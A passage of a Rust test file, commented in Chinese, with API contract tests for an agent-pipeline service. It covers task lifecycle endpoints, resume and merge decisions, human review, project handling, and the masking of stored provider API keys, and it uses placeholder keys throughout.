//! L3 API 契约测试（testing.md §7）：in-process axum router + tower oneshot，不 spawn 二进制
//! （决策 144）。
//!
//! 覆盖：端点契约、跨源防护矩阵（决策 128）、api_key 回显（决策 112）、
//! resume 游标解析（决策 91）与防连点、merge/decision（决策 119）、人工评审（决策 2）。

use std::sync::atomic::{AtomicUsize, Ordering};
use std::sync::Arc;

use agentpipeline_core::agent::market::MarketClient;
use agentpipeline_core::agent::tools::CommandRecorder;
use agentpipeline_core::config::Settings;
use agentpipeline_core::sse::{SseEvent, SseEventType};
use agentpipeline_core::types::{Provider, ReviewMode, Stage, TaskStatus};
use app::{build_router, AppState};
use axum::body::Body;
use axum::http::{header, Request, StatusCode};
use axum::Router;
use serde_json::Value;
use testkit::{
    entry, entry_with_wrong_digest, seed_project, seed_task, seed_task_full, skill_zip,
    write_skill_dir, zip_bytes, FakeMarket, Repo, TestHome,
};
use tower::ServiceExt;

const PORT: u16 = 8787;

struct Api {
    _home: TestHome,
    _repo: Repo,
    state: AppState,
    router: Router,
    resumes: Arc<AtomicUsize>,
}

async fn api() -> Api {
    api_with(Settings {
        pending_resume_cooldown_sec: 5,
        ..Default::default()
    })
    .await
}

async fn api_with(settings: Settings) -> Api {
    api_with_origins(settings, Vec::new()).await
}

async fn api_with_origins(settings: Settings, extra_origins: Vec<String>) -> Api {
    api_full(settings, extra_origins, None, Vec::new()).await
}

/// 注入技能市场客户端的 harness（票 10）。
///
/// 市场端点契约必须能**完全离线**地跑：注入 testkit 的 `FakeMarket`，于是「摘要不符」
/// 「来源未放行」这些真网络没法稳定复现的路径都成了确定性用例。
async fn api_with_market(client: Arc<dyn MarketClient>, sources: Vec<String>) -> Api {
    api_full(Settings::default(), Vec::new(), Some(client), sources).await
}

async fn api_full(
    settings: Settings,
    extra_origins: Vec<String>,
    market: Option<Arc<dyn MarketClient>>,
    market_sources: Vec<String>,
) -> Api {
    let home = TestHome::new().unwrap();
    let (store, _clock) = home.setup().await.unwrap();
    let repo = Repo::clean().unwrap();

    // 默认配一个可用 provider，否则 POST /tasks 会被决策 56 拦下
    store
        .upsert_provider(&Provider {
            id: "p-default".into(),
            vendor: "deepseek".into(),
            model: "deepseek-chat".into(),
            context_window: 64_000,
            base_url: None,
            api_key: Some("sk-super-secret-value-123456".into()),
            enabled: true,
            created_at: store.now(),
            updated_at: store.now(),
        })
        .await
        .unwrap();

    // 端口 0 会让 allowed_origins 变成 http://127.0.0.1:0；测试显式用 PORT
    let resumes = Arc::new(AtomicUsize::new(0));
    let hook_resumes = resumes.clone();
    let state = AppState::new(store, home.home().clone(), settings, PORT)
        .with_resume_hook(Arc::new(move |_task_id| {
            hook_resumes.fetch_add(1, Ordering::SeqCst);
        }))
        .with_allowed_origins(extra_origins)
        .with_market(market, market_sources);
    let router = build_router(state.clone());
    Api {
        _home: home,
        _repo: repo,
        state,
        router,
        resumes,
    }
}

fn request(method: &str, uri: &str) -> axum::http::request::Builder {
    Request::builder().method(method).uri(uri)
}

async fn json_body(response: axum::response::Response) -> (StatusCode, Value) {
    let status = response.status();
    let bytes = axum::body::to_bytes(response.into_body(), 4 * 1024 * 1024)
        .await
        .unwrap();
    let value = if bytes.is_empty() {
        Value::Null
    } else {
        serde_json::from_slice(&bytes)
            .unwrap_or(Value::String(String::from_utf8_lossy(&bytes).to_string()))
    };
    (status, value)
}

async fn call(api: &Api, req: Request<Body>) -> (StatusCode, Value) {
    let response = api.router.clone().oneshot(req).await.unwrap();
    json_body(response).await
}

async fn post(api: &Api, uri: &str, body: Value) -> (StatusCode, Value) {
    call(
        api,
        request("POST", uri)
            .header(header::CONTENT_TYPE, "application/json")
            .body(Body::from(body.to_string()))
            .unwrap(),
    )
    .await
}

async fn get(api: &Api, uri: &str) -> (StatusCode, Value) {
    call(api, request("GET", uri).body(Body::empty()).unwrap()).await
}

async fn put(api: &Api, uri: &str, body: Value) -> (StatusCode, Value) {
    call(
        api,
        request("PUT", uri)
            .header(header::CONTENT_TYPE, "application/json")
            .body(Body::from(body.to_string()))
            .unwrap(),
    )
    .await
}

async fn delete(api: &Api, uri: &str) -> (StatusCode, Value) {
    call(api, request("DELETE", uri).body(Body::empty()).unwrap()).await
}

async fn seed(api: &Api, task_id: &str) -> String {
    let project_id = format!("proj-{task_id}");
    seed_project(
        &api.state.store,
        &project_id,
        "示例",
        api._repo.path(),
        "main",
    )
    .await
    .unwrap();
    seed_task(&api.state.store, task_id, &project_id)
        .await
        .unwrap();
    project_id
}

// ─────────────────────────── POST /tasks（决策 27 / 56 / 98）───────────────────────────

#[tokio::test]
async fn create_task_lands_queued_and_with_dependency_waiting() {
    let api = api().await;
    let project_id = seed(&api, "t0").await;

    let (status, body) = post(
        &api,
        "/tasks",
        serde_json::json!({"project_id": project_id, "title": "无依赖"}),
    )
    .await;
    assert_eq!(status, StatusCode::CREATED);
    assert_eq!(body["task"]["status"], "queued");

    let (status, body) = post(
        &api,
        "/tasks",
        serde_json::json!({
            "project_id": project_id,
            "title": "有依赖",
            "depends_on": ["t0"]
        }),
    )
    .await;
    assert_eq!(status, StatusCode::CREATED);
    assert_eq!(
        body["task"]["status"], "waiting",
        "有依赖一律 waiting 落库（决策 98）"
    );
}

#[tokio::test]
async fn create_task_rejects_missing_project_and_unknown_dependency() {
    let api = api().await;
    let project_id = seed(&api, "a").await;

    // 依赖链：b 依赖 a
    let (status, body) = post(
        &api,
        "/tasks",
        serde_json::json!({"project_id": project_id, "title": "b", "depends_on": ["a"]}),
    )
    .await;
    assert_eq!(status, StatusCode::CREATED, "{body}");

    // 未知依赖 → 400
    let (status, body) = post(
        &api,
        "/tasks",
        serde_json::json!({"project_id": project_id, "title": "d", "depends_on": ["不存在"]}),
    )
    .await;
    assert_eq!(status, StatusCode::BAD_REQUEST);
    assert!(body["error"].as_str().unwrap().contains("依赖任务不存在"));

    // 未知项目 → 400
    let (status, body) = post(
        &api,
        "/tasks",
        serde_json::json!({"project_id": "不存在", "title": "x"}),
    )
    .await;
    assert_eq!(status, StatusCode::BAD_REQUEST);
    assert!(body["error"].as_str().unwrap().contains("项目不存在"));

    // 注：id 由服务端生成，API 层无法构造环——决策 27 的环检测在
    // cursor_lifecycle.rs 的 `dependency_states_and_cycle_detection` 覆盖（store 级）。
}

#[tokio::test]
async fn create_task_fails_fast_without_configured_provider() {
    // 决策 56：未配置 provider 时创建任务返回明确错误
    let api = api().await;
    let project_id = seed(&api, "t0").await;
    api.state.store.delete_provider("p-default").await.unwrap();

    let (status, body) = post(
        &api,
        "/tasks",
        serde_json::json!({"project_id": project_id, "title": "x"}),
    )
    .await;
    assert_eq!(status, StatusCode::BAD_REQUEST);
    assert!(body["error"].as_str().unwrap().contains("provider"));
}

// ─────────────────────────── GET /tasks（决策 101）───────────────────────────

#[tokio::test]
async fn list_tasks_supports_filters_and_branch_summary() {
    let api = api().await;
    let project_id = seed(&api, "t1").await;
    // 造一条 archived 任务（默认应被过滤）
    seed_task(&api.state.store, "t2", &project_id)
        .await
        .unwrap();
    api.state.store.archive_task("t2").await.unwrap();

    let (status, body) = get(&api, "/tasks").await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(body["tasks"].as_array().unwrap().len(), 1);

    let (_, body) = get(&api, "/tasks?include_archived=true").await;
    assert_eq!(body["tasks"].as_array().unwrap().len(), 2);

    let (_, body) = get(
        &api,
        &format!("/tasks?project_id={project_id}&status=queued"),
    )
    .await;
    assert_eq!(
        body["tasks"].as_array().unwrap().len(),
        1,
        "archived 任务默认不参与筛选"
    );
    let (_, body) = get(
        &api,
        &format!("/tasks?project_id={project_id}&status=queued&include_archived=true"),
    )
    .await;
    assert_eq!(body["tasks"].as_array().unwrap().len(), 2);

    // 分支级摘要
    let (_, body) = get(&api, "/tasks").await;
    let branches = body["tasks"][0]["branches"].as_array().unwrap();
    assert_eq!(branches.len(), 1);
    assert_eq!(branches[0]["branch"], "main");
    assert_eq!(branches[0]["stage"], "init");
    assert_eq!(branches[0]["node"], "execute");
}

// ─────────────────────────── GET /tasks/{id}（决策 49 / 130）───────────────────────────

#[tokio::test]
async fn task_detail_returns_allowed_actions_for_pending_cursor() {
    let api = api().await;
    seed(&api, "t1").await;
    let cursor = api.state.store.load_live_cursors("t1").await.unwrap()[0].clone();

    // 无 pending → 无动作
    let (_, body) = get(&api, "/tasks/t1").await;
    assert!(body["allowed_actions"].as_array().unwrap().is_empty());

    // 挂 info_insufficient → continue(requires_input) + cancel
    api.state
        .store
        .set_cursor_pending(
            &cursor.cursor_id,
            &agentpipeline_core::types::PendingReason::new(
                agentpipeline_core::types::PendingKind::InfoInsufficient,
                Stage::ArchitectDesign,
                agentpipeline_core::types::Node::ValidateInput,
                "信息不足",
            ),
        )
        .await
        .unwrap();
    api.state.store.sync_task_projection("t1").await.unwrap();

    let (_, body) = get(&api, "/tasks/t1").await;
    let actions = body["allowed_actions"].as_array().unwrap();
    assert_eq!(actions.len(), 2);
    assert_eq!(actions[0]["action"], "continue");
    assert_eq!(actions[0]["requires_input"], true);
    assert_eq!(actions[0]["kind"], "resume");
    assert_eq!(actions[0]["cursor_id"], cursor.cursor_id);
    assert_eq!(actions[1]["kind"], "side_effect");
}

// ─────────────────────────── POST /resume（决策 91 / 49 / 防连点）───────────────────────────

#[tokio::test]
async fn resume_omits_cursor_id_only_when_exactly_one_cursor() {
    let api = api().await;
    seed(&api, "t1").await;
    let cursor = api.state.store.load_live_cursors("t1").await.unwrap()[0].clone();
    api.state
        .store
        .set_cursor_pending(
            &cursor.cursor_id,
            &agentpipeline_core::types::PendingReason::new(
                agentpipeline_core::types::PendingKind::InfoInsufficient,
                Stage::ArchitectDesign,
                agentpipeline_core::types::Node::ValidateInput,
                "补齐信息",
            ),
        )
        .await
        .unwrap();
    api.state.store.sync_task_projection("t1").await.unwrap();

    // 恰好一条 → 可省略
    let (status, body) = post(
        &api,
        "/tasks/t1/resume",
        serde_json::json!({"action": "continue"}),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{body}");
    assert_eq!(body["spawned"], true);
    assert_eq!(api.resumes.load(Ordering::SeqCst), 1);
    assert!(api
        .state
        .store
        .get_cursor(&cursor.cursor_id)
        .await
        .unwrap()
        .pending_reason
        .is_none());

    // 分裂成两条后再次 resume 且不给 cursor_id → 409（决策 91）
    api.state.store.split_cursors("t1").await.unwrap();
    let (status, body) = post(
        &api,
        "/tasks/t1/resume",
        serde_json::json!({"action": "continue"}),
    )
    .await;
    assert_eq!(status, StatusCode::CONFLICT, "{body}");
    assert!(body["error"].as_str().unwrap().contains("cursor_id"));
}

#[tokio::test]
async fn resume_rejects_action_outside_allowed_set() {
    let api = api().await;
    seed(&api, "t1").await;
    let cursor = api.state.store.load_live_cursors("t1").await.unwrap()[0].clone();
    // merge_approval 只允许 approve / return（side_effect），不含 skip
    api.state
        .store
        .set_cursor_pending(
            &cursor.cursor_id,
            &agentpipeline_core::types::PendingReason::new(
                agentpipeline_core::types::PendingKind::MergeApproval,
                Stage::Merge,
                agentpipeline_core::types::Node::Execute,
                "等待审批",
            ),
        )
        .await
        .unwrap();

    let (status, body) = post(
        &api,
        "/tasks/t1/resume",
        serde_json::json!({"action": "skip"}),
    )
    .await;
    assert_eq!(status, StatusCode::BAD_REQUEST);
    assert!(body["error"].as_str().unwrap().contains("允许集合"));
}

#[tokio::test]
async fn resume_cooldown_prevents_double_spawn() {
    // §3 pending_resume_cooldown_sec：第二次 resume 不重复启动（固定时钟下必然命中）
    let api = api().await;
    seed(&api, "t1").await;

    for _ in 0..2 {
        let cursor = api.state.store.load_live_cursors("t1").await.unwrap()[0].clone();
        api.state
            .store
            .set_cursor_pending(
                &cursor.cursor_id,
                &agentpipeline_core::types::PendingReason::new(
                    agentpipeline_core::types::PendingKind::InfoInsufficient,
                    Stage::ArchitectDesign,
                    agentpipeline_core::types::Node::ValidateInput,
                    "补齐",
                ),
            )
            .await
            .unwrap();
        let (status, _) = post(
            &api,
            "/tasks/t1/resume",
            serde_json::json!({"action": "continue"}),
        )
        .await;
        assert_eq!(status, StatusCode::OK);
    }

    // 第一次 spawn，第二次因冷却被拦（决策 36 的单执行者守卫）
    assert_eq!(api.resumes.load(Ordering::SeqCst), 1);
}

// ─────────────────────────── merge/decision（决策 119）───────────────────────────

#[tokio::test]
async fn merge_decision_approve_and_return_move_the_cursor() {
    let api = api().await;
    seed(&api, "t1").await;
    // 造出 merge 阶段的 pending(merge_approval)
    api.state
        .store
        .replace_cursors_with_main(
            "t1",
            Stage::Merge,
            agentpipeline_core::types::Node::Execute,
            "main",
        )
        .await
        .unwrap();
    api.state
        .store
        .upsert_stage_output(
            "t1",
            Stage::Merge,
            agentpipeline_core::types::MERGE_OUTPUT_TYPE,
            "merge-proposal.diff",
            // 文档必填字段齐全（缺字段 = 行损坏，反序列化必须报错而不是静默兜底）
            Some(&serde_json::json!({
                "diff_path": "merge-proposal.diff",
                "diff_stats": {"files_changed": 1, "insertions": 0, "deletions": 0, "file_details": []},
                "base_commit": "basesha",
                "gate": "pass",
                "gate_failures": 2,
                "approval": "pending",
                "status": "pending_approval"
            })),
        )
        .await
        .unwrap();
    let cursor = api.state.store.load_live_cursors("t1").await.unwrap()[0].clone();
    api.state
        .store
        .set_cursor_pending(
            &cursor.cursor_id,
            &agentpipeline_core::types::PendingReason::new(
                agentpipeline_core::types::PendingKind::MergeApproval,
                Stage::Merge,
                agentpipeline_core::types::Node::Execute,
                "等待审批",
            ),
        )
        .await
        .unwrap();

    // approve → 重入 merge.execute 走阶段 B
    let (status, body) = post(
        &api,
        "/tasks/t1/merge/decision",
        serde_json::json!({"decision": "approve"}),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{body}");
    let after = body["cursor"].clone();
    assert_eq!(after["stage"], "merge");
    assert_eq!(after["node"], "execute");

    // approval 落库为 approved
    let meta = api
        .state
        .store
        .stage_output_metadata(
            "t1",
            Stage::Merge,
            agentpipeline_core::types::MERGE_OUTPUT_TYPE,
        )
        .await
        .unwrap()
        .unwrap();
    assert_eq!(meta["approval"], "approved");

    // return → develop.execute，attempts 重置
    api.state
        .store
        .set_cursor_pending(
            &api.state.store.load_live_cursors("t1").await.unwrap()[0]
                .cursor_id
                .clone(),
            &agentpipeline_core::types::PendingReason::new(
                agentpipeline_core::types::PendingKind::MergeApproval,
                Stage::Merge,
                agentpipeline_core::types::Node::Execute,
                "再审批",
            ),
        )
        .await
        .unwrap();
    let (status, body) = post(
        &api,
        "/tasks/t1/merge/decision",
        serde_json::json!({"decision": "return"}),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{body}");
    assert_eq!(body["cursor"]["stage"], "develop");
    assert_eq!(body["cursor"]["node"], "execute");
}

// ─────────────────────────── 人工评审（决策 2 / 124）───────────────────────────

#[tokio::test]
async fn human_review_routes_to_test_or_develop() {
    let api = api().await;
    let project_id = seed(&api, "t1").await;
    seed_task_full(
        &api.state.store,
        "t-human",
        &project_id,
        ReviewMode::Human,
        &[],
    )
    .await
    .unwrap();

    // 非 human 模式拒绝
    let (status, _) = post(
        &api,
        "/tasks/t1/review",
        serde_json::json!({"approved": true}),
    )
    .await;
    assert_eq!(status, StatusCode::BAD_REQUEST);

    // human approve → test.execute
    api.state
        .store
        .replace_cursors_with_main(
            "t-human",
            Stage::Review,
            agentpipeline_core::types::Node::ValidateOutput,
            "main",
        )
        .await
        .unwrap();
    let (status, body) = post(
        &api,
        "/tasks/t-human/review",
        serde_json::json!({"approved": true}),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{body}");
    assert_eq!(body["stage"], "test");

    // human reject → develop.execute
    api.state
        .store
        .replace_cursors_with_main(
            "t-human",
            Stage::Review,
            agentpipeline_core::types::Node::ValidateOutput,
            "main",
        )
        .await
        .unwrap();
    let (status, body) = post(
        &api,
        "/tasks/t-human/review",
        serde_json::json!({"approved": false}),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{body}");
    assert_eq!(body["stage"], "develop");
}

// ─────────────────────────── 旁路端点（决策 105 / 117 / 125 / 34）───────────────────────────

#[tokio::test]
async fn retry_requires_terminal_and_requeues() {
    let api = api().await;
    seed(&api, "t1").await;

    // 非终态拒绝
    let (status, _) = post(&api, "/tasks/t1/retry", serde_json::json!({})).await;
    assert_eq!(status, StatusCode::BAD_REQUEST);

    api.state
        .store
        .mark_terminal("t1", TaskStatus::Failed)
        .await
        .unwrap();
    let (status, body) = post(&api, "/tasks/t1/retry", serde_json::json!({})).await;
    assert_eq!(status, StatusCode::OK, "{body}");
    let task = api.state.store.get_task("t1").await.unwrap();
    assert_eq!(
        task.status,
        TaskStatus::Queued,
        "重试置回 queued 重新准入（决策 117）"
    );
    // 旧游标归档、新 main 指向 init
    let live = api.state.store.load_live_cursors("t1").await.unwrap();
    assert_eq!(live.len(), 1);
    assert_eq!(live[0].stage, Stage::Init);
}

#[tokio::test]
async fn retry_archives_old_conversations_and_default_list_excludes_them() {
    // §12.2 / 决策 113 同构：重试归档旧会话；列表默认过滤，include_archived 可取回
    let api = api().await;
    seed(&api, "t1").await;
    let cursor = api.state.store.load_live_cursors("t1").await.unwrap()[0].clone();
    let store = &api.state.store;
    let run = store
        .insert_run(&agentpipeline_core::storage::observability::NewRun {
            task_id: "t1".into(),
            cursor_id: cursor.cursor_id.clone(),
            stage: Stage::ArchitectDesign,
            node: agentpipeline_core::types::Node::Execute,
            attempt: 1,
            agent_type: "main".into(),
            parent_run_id: None,
            prompt_template_hash: None,
            process_group_id: None,
        })
        .await
        .unwrap();
    store
        .insert_conversation(
            "t1",
            run,
            Stage::ArchitectDesign,
            agentpipeline_core::types::Node::Execute,
            1,
            "main",
            None,
            &serde_json::json!([{"role": "user", "content": "旧 attempt"}]),
            None,
            10,
            5,
        )
        .await
        .unwrap();

    // 未重试前默认可见
    let (_, body) = get(&api, "/tasks/t1/conversations").await;
    assert_eq!(body["conversations"].as_array().unwrap().len(), 1);

    store.mark_terminal("t1", TaskStatus::Failed).await.unwrap();
    let (status, body) = post(&api, "/tasks/t1/retry", serde_json::json!({})).await;
    assert_eq!(status, StatusCode::OK, "{body}");

    // 默认列表不混入旧 attempt
    let (_, body) = get(&api, "/tasks/t1/conversations").await;
    assert!(
        body["conversations"].as_array().unwrap().is_empty(),
        "默认列表应过滤已归档会话：{body}"
    );

    // 历史可按参数取回
    let (_, body) = get(&api, "/tasks/t1/conversations?include_archived=true").await;
    let conversations = body["conversations"].as_array().unwrap();
    assert_eq!(conversations.len(), 1);
    assert!(conversations[0]["archived_at"].is_string(), "应带归档时间");

    // 不物理删除：整条会话仍可取回
    let (status, body) = get(&api, &format!("/tasks/t1/conversations/{run}")).await;
    assert_eq!(status, StatusCode::OK);
    assert!(body["conversation"]["archived_at"].is_string());
}

#[tokio::test]
async fn conversation_messages_endpoint_returns_messages_and_is_task_scoped() {
    // §12.4.3：按任务 + run 取 messages；正常取回、任务隔离、越权 404
    let api = api().await;
    seed(&api, "t1").await;
    seed(&api, "t2").await;
    let cursor = api.state.store.load_live_cursors("t1").await.unwrap()[0].clone();
    let store = &api.state.store;
    let run = store
        .insert_run(&agentpipeline_core::storage::observability::NewRun {
            task_id: "t1".into(),
            cursor_id: cursor.cursor_id.clone(),
            stage: Stage::Develop,
            node: agentpipeline_core::types::Node::Execute,
            attempt: 1,
            agent_type: "main".into(),
            parent_run_id: None,
            prompt_template_hash: None,
            process_group_id: None,
        })
        .await
        .unwrap();
    store
        .insert_conversation(
            "t1",
            run,
            Stage::Develop,
            agentpipeline_core::types::Node::Execute,
            1,
            "main",
            None,
            &serde_json::json!([
                {"role": "user", "content": "实现登录"},
                {"role": "assistant", "content": "好的"}
            ]),
            None,
            10,
            5,
        )
        .await
        .unwrap();

    // 正常取回：响应体就是 messages 数组
    let (status, body) = get(&api, &format!("/tasks/t1/conversations/{run}/messages")).await;
    assert_eq!(status, StatusCode::OK, "{body}");
    let messages = body.as_array().unwrap();
    assert_eq!(messages.len(), 2);
    assert_eq!(messages[0]["role"], "user");
    assert_eq!(messages[0]["content"], "实现登录");

    // 任务隔离：run 属于 t1，从 t2 取一律 404，不泄露其他任务数据
    let (status, body) = get(&api, &format!("/tasks/t2/conversations/{run}/messages")).await;
    assert_eq!(status, StatusCode::NOT_FOUND, "{body}");

    // 不存在的 run 也 404
    let (status, _) = get(&api, "/tasks/t1/conversations/999999/messages").await;
    assert_eq!(status, StatusCode::NOT_FOUND);
}

#[tokio::test]
async fn cancel_marks_terminal_and_notifies_dependents() {
    let api = api().await;
    let project_id = seed(&api, "dep").await;
    seed_task_full(
        &api.state.store,
        "dependent",
        &project_id,
        ReviewMode::Agent,
        &["dep"],
    )
    .await
    .unwrap();

    let (status, body) = post(&api, "/tasks/dep/cancel", serde_json::json!({})).await;
    assert_eq!(status, StatusCode::OK, "{body}");
    assert_eq!(body["notified"][0], "dependent");

    let dep = api.state.store.get_task("dep").await.unwrap();
    assert_eq!(dep.status, TaskStatus::Cancelled);
    let dependent = api.state.store.get_task("dependent").await.unwrap();
    assert_eq!(dependent.status, TaskStatus::Pending);
    let reason = dependent.pending_reason.unwrap();
    assert_eq!(
        reason.kind,
        agentpipeline_core::types::PendingKind::DependencyFailed
    );
    assert_eq!(
        reason.context.unwrap().kind.as_deref(),
        Some("dependency_cancelled")
    );
}

#[tokio::test]
async fn archive_requires_terminal_and_splits_into_new_tasks() {
    let api = api().await;
    let project_id = seed(&api, "t1").await;

    let (status, _) = post(&api, "/tasks/t1/archive", serde_json::json!({})).await;
    assert_eq!(status, StatusCode::BAD_REQUEST);
    api.state
        .store
        .mark_terminal("t1", TaskStatus::Cancelled)
        .await
        .unwrap();
    let (status, _) = post(&api, "/tasks/t1/archive", serde_json::json!({})).await;
    assert_eq!(status, StatusCode::OK);
    assert!(api
        .state
        .store
        .get_task("t1")
        .await
        .unwrap()
        .archived_at
        .is_some());

    // split：创建 N 个 + 原任务置 cancelled
    seed(&api, "t9").await;
    let (status, body) = post(
        &api,
        "/tasks/t9/split",
        serde_json::json!({"tasks": [{"title": "子 1"}, {"title": "子 2"}]}),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{body}");
    assert_eq!(body["created"].as_array().unwrap().len(), 2);
    assert_eq!(
        api.state.store.get_task("t9").await.unwrap().status,
        TaskStatus::Cancelled
    );
    let _ = project_id;
}

#[tokio::test]
async fn model_override_validates_whitelist_and_scope() {
    let api = api().await;
    seed(&api, "t1").await;
    seed(&api, "t2").await;

    let (status, _) = post(
        &api,
        "/tasks/t1/model-override",
        serde_json::json!({"provider_id": "不存在"}),
    )
    .await;
    assert_eq!(status, StatusCode::BAD_REQUEST);

    let (status, _) = post(
        &api,
        "/tasks/t1/model-override",
        serde_json::json!({"provider_id": "p-default"}),
    )
    .await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(
        api.state
            .store
            .get_task("t1")
            .await
            .unwrap()
            .model_override
            .as_deref(),
        Some("p-default")
    );
    // 只影响本任务（决策 105）
    assert!(api
        .state
        .store
        .get_task("t2")
        .await
        .unwrap()
        .model_override
        .is_none());
}

// ─────────────────────────── 项目端点（决策 61 / 101）───────────────────────────

#[tokio::test]
async fn project_creation_rejects_non_git_and_delete_refuses_active_tasks() {
    let api = api().await;
    let plain = api._home.scratch_dir("not-a-repo");

    let (status, body) = post(
        &api,
        "/projects",
        serde_json::json!({"name": "非 git", "local_path": plain.display().to_string()}),
    )
    .await;
    assert_eq!(status, StatusCode::BAD_REQUEST);
    assert!(body["error"].as_str().unwrap().contains("不是 git 仓库"));

    // 正常创建
    let (status, body) = post(
        &api,
        "/projects",
        serde_json::json!({"name": "示例", "local_path": api._repo.path().display().to_string()}),
    )
    .await;
    assert_eq!(status, StatusCode::CREATED, "{body}");
    let project_id = body["project"]["id"].as_str().unwrap().to_string();
    assert_eq!(body["project"]["default_branch"], "main");
    assert_eq!(body["project"]["language"], "rust");
    assert_eq!(body["project"]["test_framework"], "cargo");

    // 有活跃任务 → 拒绝删除
    seed_task(&api.state.store, "t1", &project_id)
        .await
        .unwrap();
    let (status, body) = call(
        &api,
        request("DELETE", &format!("/projects/{project_id}"))
            .body(Body::empty())
            .unwrap(),
    )
    .await;
    assert_eq!(status, StatusCode::CONFLICT, "{body}");

    // 任务的写端点（cancel）后仍不活跃 → 可删
    post(&api, "/tasks/t1/cancel", serde_json::json!({})).await;
    let (status, _) = call(
        &api,
        request("DELETE", &format!("/projects/{project_id}"))
            .body(Body::empty())
            .unwrap(),
    )
    .await;
    assert_eq!(status, StatusCode::OK);
}

#[tokio::test]
async fn project_analyze_is_async_and_pollable() {
    let api = api().await;
    let (_, body) = post(
        &api,
        "/projects",
        serde_json::json!({"name": "示例", "local_path": api._repo.path().display().to_string()}),
    )
    .await;
    let project_id = body["project"]["id"].as_str().unwrap().to_string();

    let (status, body) = post(
        &api,
        "/projects/analyze",
        serde_json::json!({"project_id": project_id}),
    )
    .await;
    assert_eq!(status, StatusCode::ACCEPTED, "决策 130 ⑦：202 + 轮询");
    assert!(body["analysis_id"].is_string());

    // 探测在后台任务里完成，轮询直到 done
    for _ in 0..50 {
        let (_, body) = get(&api, &format!("/projects/{project_id}/analysis")).await;
        if body["status"] == "done" {
            assert_eq!(body["result"]["language"], "rust");
            assert_eq!(body["result"]["has_gitignore"], true);
            return;
        }
        tokio::time::sleep(std::time::Duration::from_millis(20)).await;
    }
    panic!("项目分析未在预期时间内完成");
}

// ─────────────────────────── provider（决策 112）───────────────────────────

#[tokio::test]
async fn provider_read_api_masks_api_key_and_patch_keeps_secret() {
    let api = api().await;

    let (status, body) = get(&api, "/providers").await;
    assert_eq!(status, StatusCode::OK);
    let providers = body["providers"].as_array().unwrap();
    assert_eq!(providers[0]["api_key"], "***");
    assert!(
        !body.to_string().contains("sk-super-secret-value-123456"),
        "读接口不得返回原值"
    );

    // PATCH 里传回显值 "***" 不得把真密钥覆盖掉
    let (status, _) = call(
        &api,
        request("PATCH", "/providers/p-default")
            .header(header::CONTENT_TYPE, "application/json")
            .body(Body::from(
                serde_json::json!({"api_key": "***", "enabled": false}).to_string(),
            ))
            .unwrap(),
    )
    .await;
    assert_eq!(status, StatusCode::OK);
    let raw = api
        .state
        .store
        .get_provider("p-default")
        .await
        .unwrap()
        .unwrap();
    assert_eq!(raw.api_key.as_deref(), Some("sk-super-secret-value-123456"));
    assert!(!raw.enabled);

    // 真传新密钥才覆盖
    call(
        &api,
        request("PATCH", "/providers/p-default")
            .header(header::CONTENT_TYPE, "application/json")
            .body(Body::from(
                serde_json::json!({"api_key": "sk-new-key-abcdefghijkl"}).to_string(),
            ))
            .unwrap(),
    )
    .await;
    let raw = api
        .state
        .store
        .get_provider("p-default")
        .await
        .unwrap()
        .unwrap();
    assert_eq!(raw.api_key.as_deref(), Some("sk-new-key-abcdefghijkl"));
}

// ─────────────────────── provider 测试连接（决策 160）───────────────────────

#[tokio::test]
async fn provider_test_classifies_auth_failure_and_never_echoes_key() {
    let api = api().await;
    let mock = testkit::mock_llm::MockLlm::start(vec![testkit::mock_llm::MockRoute::json(
        "/chat/completions",
        401,
        r#"{"error":{"message":"invalid api key"}}"#,
    )])
    .await;

    let (status, body) = post(
        &api,
        "/providers/test",
        serde_json::json!({
            "id": "p-default",
            "vendor": "deepseek",
            "model": "deepseek-chat",
            "base_url": mock.url,
            "api_key": "***",
        }),
    )
    .await;
    assert_eq!(status, StatusCode::OK);
    let test = &body["test"];
    assert_eq!(test["ok"], false);
    assert_eq!(test["kind"], "llm_auth");
    assert!(test["message"].as_str().unwrap().contains("鉴权失败"));
    let raw = test["raw"].as_str().unwrap();
    assert!(raw.contains("401"), "{raw}");
    assert!(raw.contains("invalid api key"), "{raw}");
    // 决策 112：掩码语义不因探针弱化——响应与原始密钥无关
    assert!(
        !body.to_string().contains("sk-super-secret-value-123456"),
        "测试连接不得回传 api_key"
    );
    mock.shutdown().await;
}

#[tokio::test]
async fn provider_test_success_reuses_stored_key_without_echoing() {
    let api = api().await;
    let mock = testkit::mock_llm::MockLlm::start(vec![testkit::mock_llm::MockRoute::sse(
        "/chat/completions",
        "data: {\"choices\":[{\"delta\":{\"content\":\"hi\"}}]}\n\ndata: [DONE]\n\n",
    )])
    .await;

    // 表单回显值 "***" + id 命中 → 后端用已存密钥发探针
    let (status, body) = post(
        &api,
        "/providers/test",
        serde_json::json!({
            "id": "p-default",
            "vendor": "deepseek",
            "model": "deepseek-chat",
            "base_url": mock.url,
            "api_key": "***",
        }),
    )
    .await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(body["test"]["ok"], true, "{}", body);
    assert_eq!(body["test"]["message"], "连接成功");

    let requests = mock.requests().await;
    assert_eq!(requests.len(), 1);
    let auth = requests[0].header("authorization").expect("探针应带密钥");
    assert_eq!(auth, "Bearer sk-super-secret-value-123456");
    assert!(
        !body.to_string().contains("sk-super-secret-value-123456"),
        "响应不得回显密钥"
    );
    mock.shutdown().await;
}

#[tokio::test]
async fn provider_test_without_id_requires_explicit_key() {
    let api = api().await;
    let (status, body) = post(
        &api,
        "/providers/test",
        serde_json::json!({
            "vendor": "deepseek",
            "model": "deepseek-chat",
            "api_key": "***",
        }),
    )
    .await;
    assert_eq!(status, StatusCode::BAD_REQUEST);
    assert!(body["error"].as_str().unwrap().contains("api_key"));

    // 未知 vendor 在适配器族白名单（决策 103）处被挡，给可读结论而非 500
    let (status, body) = post(
        &api,
        "/providers/test",
        serde_json::json!({
            "vendor": "not-a-vendor",
            "model": "m",
            "api_key": "sk-x",
        }),
    )
    .await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(body["test"]["ok"], false);
    assert!(body["test"]["message"].as_str().unwrap().contains("vendor"));
}

// ─────────────────────────── 跨源防护矩阵（决策 128）───────────────────────────

#[tokio::test]
